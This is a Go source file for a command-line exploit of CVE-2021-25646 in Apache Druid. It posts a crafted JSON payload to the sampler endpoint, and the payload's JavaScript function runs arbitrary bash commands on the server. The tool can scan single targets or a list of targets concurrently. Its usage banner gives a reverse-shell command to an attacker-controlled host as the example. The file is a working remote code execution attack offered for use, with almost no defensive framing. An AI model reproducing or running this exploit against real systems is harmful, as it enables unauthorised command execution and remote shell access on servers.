package druid

import (
	"bytes"
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
	"vul/config"
)

func Druid() {
	banner := `

		|￣￣￣￣￣￣￣￣￣￣￣￣| 	用法：执行下面的命令，检测漏洞是否存在，可单个目标或者批量检测
		 |                      |	
		 |  我要成为大黑客...   |	-t <域名>  eg：CVE-2021-25646 -t example.com
		 |                      |	-t <ip:端口>  eg：CVE-2021-25646 -t 127.0.0.1:8888
		|＿＿＿＿＿＿＿miaomiao~| 	-l <目标文件>  eg：CVE-2021-25646 -l domain.txt
	       ||
	(\__/) ||               
	(•ㅅ•) ||               
	/ 　 づv               
	`
	fmt.Println(banner)
	fmt.Println(" [!] ---------------------------------" + color.RedString("CVE-2021-25646") + "----------------------------------------")
	fmt.Println(color.YellowString(" [!] 对探测出存在漏洞的目标进行利用，eg: CVE-2021-25646 -t <target> <要执行的命令>"))
	fmt.Println(color.YellowString(" [!] 如果要执行的命令中存在空格，请将要执行的命令用双引号进行包括"))
	fmt.Println(color.YellowString(" [!] 例如：CVE-2021-25646 -t 127.0.0.1:8888 \"bash -i >& /dev/tcp/vps_ip/vps_port 0>&1\""))
	fmt.Println(" [!] ---------------------------------------------------------------------------------------")
	fmt.Println("")

	// 判断是否输入了参数
	if len(os.Args) < 2 || (os.Args[1] != "-t" && os.Args[1] != "-l") {
		fmt.Println("")
		fmt.Println(color.GreenString("			<--- 请输入正确的参数 --->"))
		os.Exit(0)
	} else if len(os.Args) < 3 {
		fmt.Println("")
		fmt.Println(color.RedString("			<--- 未给参数传值，请输入目标 --->"))
		os.Exit(0)
	}

	// 接收第二个参数,作为单个目标的值
	target := os.Args[2]
	if strings.Contains(target, "//") || strings.Contains(target, "http:") || strings.Contains(target, "https:") {
		fmt.Println(color.RedString("			<--- 目标格式输入输入错误 --->"))
		os.Exit(0)
	}

	// 创建一个 HTTP 客户端，设置超时时间
	client := &http.Client{
		Timeout: 10 * time.Second, // 设置超时时间为 10 秒
	}
	//对输入的第一个参数进行判断
	if os.Args[1] == "-t" {
		druid_CVE_2021_25646(client, target)

	} else if os.Args[1] == "-l" {
		targets := config.ReadFile(target)
		// 使用 WaitGroup 来等待所有 goroutine 完成
		var wg sync.WaitGroup

		for _, target := range targets {
			wg.Add(1)

			go func(target string) {
				defer wg.Done()
				druid_CVE_2021_25646(client, target)
			}(target)
		}
		wg.Wait() // 等待所有 goroutine 完成
	}

}

// 远程代码执行
func druid_CVE_2021_25646(client *http.Client, target string) {

	cmd := ""
	// 此变量用于状态检验，检查是进行命令执行还是漏洞探测，0 --> 漏洞探测
	status := 0
	if len(os.Args) < 4 {
		cmd = "id"
	} else {
		cmd = os.Args[3]
		status = 1
	}

	//要请求的地址
	url := "http://" + target + "/druid/indexer/v1/sampler"

	//创建json字符串，作为要发送的post请求内容
	json_data := fmt.Sprintf(`{
		"type":"index",
			"spec":{
			"ioConfig":{
				"type":"index",
					"firehose":{
					"type":"local",
						"baseDir":"/etc",
						"filter":"passwd"
				}
			},
			"dataSchema":{
				"dataSource":"test",
					"parser":{
					"parseSpec":{
						"format":"javascript",
							"timestampSpec":{

						},
						"dimensionsSpec":{

						},
						"function":"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"bash\",\"-c\",\"%s\"]).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:123123,test: a}}",
							"":{
							"enabled":"true"
						}
					}
				}
			}
		},
		"samplerConfig":{
			"numRows":10
		}
	}`, cmd)

	//创建请求
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(json_data)))
	if err != nil {
		fmt.Println("请求错误:", err)
		return
	}

	// 设置请求头
	req.Header.Set("Content-Type", "application/json")

	// 创建 HTTP 客户端并发送请求
	//client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		//fmt.Println("Error sending request:", err)
		fmt.Println(color.BlueString(" [!] " + target + " payload请求失败"))
		return
	}
	defer resp.Body.Close()

	// 读取响应体
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(" [!] " + target + " 响应内容获取失败")
		return
	}

	if strings.Contains(string(body), "uid=") && status == 0 {
		fmt.Println(color.RedString(" [+] " + target + " CVE-2021-25646 漏洞存在,可输入命令进行执行"))
		return
	} else if !strings.Contains(string(body), "uid=") && status == 0 {
		fmt.Println(color.MagentaString(" [-] " + target + " CVE-2021-25646 漏洞不存在"))
		return
	}

	// 输出响应状态和内容
	fmt.Println(" [!] -----------------------------------" + color.GreenString("执行结果") + "--------------------------------------------")
	fmt.Println(color.GreenString(" [*] 状态码: " + resp.Status))
	fmt.Println(color.GreenString(" [*] 响应内容: " + string(body)))

}
